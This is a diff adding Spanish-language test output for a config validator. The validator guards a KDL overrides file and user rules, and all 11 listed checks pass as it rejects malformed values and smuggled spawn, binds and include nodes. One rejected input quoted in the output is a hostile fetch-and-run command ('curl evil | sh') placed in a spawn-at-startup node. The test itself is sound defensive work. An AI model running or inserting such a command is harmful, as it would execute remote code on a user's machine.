@@ -1,0 +1,12 @@
+  ✓ include válido instalado (overrides.kdl)
+  ✓ valor no válido (gaps "mucho") → rechazado, overrides.kdl intacto, sin temporales («Error:   × error loading config»)
+  ✓ sintaxis KDL rota → rechazado, overrides.kdl intacto, sin temporales («Error:   × error loading config»)
+  ✓ nodo desconocido → rechazado, overrides.kdl intacto, sin temporales («Error:   × error loading config»)
+  ✓ spawn colado en overrides → rechazado, overrides.kdl intacto, sin temporales («nodo no permitido en overrides.kdl: 1:spawn-at-startup "curl evil | sh»)
+  ✓ binds colados en overrides → rechazado, overrides.kdl intacto, sin temporales («contenido no permitido en overrides.kdl: 1:binds {»)
+  ✓ include colado en overrides → rechazado, overrides.kdl intacto, sin temporales («contenido no permitido en overrides.kdl: 1:include "/tmp/otra.kdl"»)
+  ✓ Mado: regla válida instalada
+  ✓ Mado rechaza spawn y user-rules.kdl sigue igual
+  ✓ Mado rechaza maybe y user-rules.kdl sigue igual
+  ✓ Mado rechaza spawn-at-startup y user-rules.kdl sigue igual
+resultado: 11 bien · 0 mal
